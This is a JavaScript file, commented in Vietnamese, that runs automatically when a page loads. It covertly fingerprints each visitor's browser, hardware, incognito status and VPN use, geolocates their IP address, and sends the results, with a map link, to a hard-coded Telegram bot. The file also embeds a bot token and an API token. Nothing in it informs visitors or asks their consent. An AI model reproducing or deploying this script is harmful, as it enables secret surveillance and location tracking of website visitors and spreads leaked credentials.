const TELEGRAM_BOT_TOKEN = "8150545362:AAEKUQF0tJ7qkpMajhpV48baUbZ5IHnF-HA"; // ⚠️ NÊN ĐỔI TOKEN MỚI
const TELEGRAM_CHAT_ID = "6339940126"; // ID Telegram nhận tin nhắn



// 📌 Lấy tên trình duyệt chính xác
function getBrowserName() {
    let userAgent = navigator.userAgent;

    if (navigator.brave && (navigator.brave.isBrave || navigator.brave.isBraveSyncEnabled)) return "Brave";
    if (userAgent.includes("Edg/")) return "Microsoft Edge";
    if (userAgent.includes("OPR/") || userAgent.includes("Opera")) return "Opera";
    if (userAgent.includes("Firefox")) return "Mozilla Firefox";
    if (userAgent.includes("coc_coc_browser")) return "Cốc Cốc";
    if (userAgent.includes("Chrome")) return "Google Chrome";
    if (userAgent.includes("Safari")) return "Safari";
    if (userAgent.includes("Trident/") || userAgent.includes("MSIE")) return "Internet Explorer";

    return "Không xác định";
}

// 📌 Kiểm tra chế độ ẩn danh
async function isIncognito() {
    return new Promise((resolve) => {
        let fs = window.RequestFileSystem || window.webkitRequestFileSystem;
        if (!fs) resolve(false);
        else {
            fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
        }
    });
}

// 📌 Kiểm tra có dùng VPN/Proxy không
async function isUsingProxyOrVPN() {
    try {
        let response = await fetch("https://api64.ipify.org?format=json");
        let data = await response.json();
        let ip = data.ip;

        let checkResponse = await fetch(`https://vpnapi.io/api/${ip}?key=free`);
        let checkData = await checkResponse.json();

        return checkData.security.vpn || checkData.security.proxy || checkData.security.tor;
    } catch (error) {
        return "Không xác định";
    }
}

// 📌 Lấy thông tin thiết bị
async function getDeviceFingerprint() {
    let canvas = document.createElement("canvas");
    let gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    let debugInfo = gl ? gl.getExtension("WEBGL_debug_renderer_info") : null;

    return {
        browser: getBrowserName(),
        incognito: await isIncognito(),
        vpnProxy: await isUsingProxyOrVPN(),
        platform: navigator.platform,
        cpuCores: navigator.hardwareConcurrency || "Không xác định",
        ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Không xác định",
        gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Không xác định",
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screenResolution: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        plugins: Array.from(navigator.plugins).map(p => p.name).join(", "),
    };
}

// 📌 Lấy vị trí & gửi lên Telegram
async function sendInfoToTelegram() {
    const fingerprint = await getDeviceFingerprint();
    let city = "Không xác định";
    let region = "Không xác định";
    let country = "Không xác định";
    let latitude = "Không xác định";
    let longitude = "Không xác định";
    let ipAddress = "Không xác định";

    try {
        let response = await fetch("https://ipinfo.io/json?token=ffafdfeb7f37bf");
        let data = await response.json();

        if (data.city) city = data.city;
        if (data.region) region = data.region;
        if (data.country) country = data.country;
        if (data.ip) ipAddress = data.ip;
        if (data.loc) [latitude, longitude] = data.loc.split(",");
    } catch (error) {
        console.log("Lỗi API ipinfo.io, thử API khác...");

        try {
            let fallbackResponse = await fetch("http://ip-api.com/json/");
            let fallbackData = await fallbackResponse.json();

            if (fallbackData.city) city = fallbackData.city;
            if (fallbackData.regionName) region = fallbackData.regionName;
            if (fallbackData.country) country = fallbackData.country;
            if (fallbackData.query) ipAddress = fallbackData.query;
            if (fallbackData.lat) latitude = fallbackData.lat;
            if (fallbackData.lon) longitude = fallbackData.lon;
        } catch (fallbackError) {
            console.log("Không thể lấy vị trí từ API dự phòng.");
        }
    }

    let now = new Date();
    let dateTime = now.toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });

    // Gửi tin nhắn đến Telegram
    const locationUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const message = `
🔍 **THÔNG TIN TRUY CẬP**
🕒 Thời gian: ${dateTime}
📌 Địa chỉ IP: ${ipAddress}
🌍 Vị trí: [Xem trên bản đồ](${locationUrl})
🏙️ Thành phố: ${city}
🏛️ Tỉnh/Bang: ${region}
🌏 Quốc gia: ${country}

🖥️ **THÔNG TIN HỆ THỐNG**
🌐 Trình duyệt: ${fingerprint.browser}
🕵️ Ẩn danh: ${fingerprint.incognito ? "Có" : "Không"}
🔒 VPN/Proxy: ${fingerprint.vpnProxy ? "Có" : "Không"}
💻 Hệ điều hành: ${fingerprint.platform}
🧠 CPU: ${fingerprint.cpuCores} lõi
🎮 GPU: ${fingerprint.gpu}
🛠️ RAM: ${fingerprint.ram}
🖥️ Độ phân giải màn hình: ${fingerprint.screenResolution}
🎨 Độ sâu màu: ${fingerprint.colorDepth}
🔌 Plugin trình duyệt: ${fingerprint.plugins}
`;

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        })
    });
}

// 📌 Gọi hàm khi trang tải
sendInfoToTelegram();
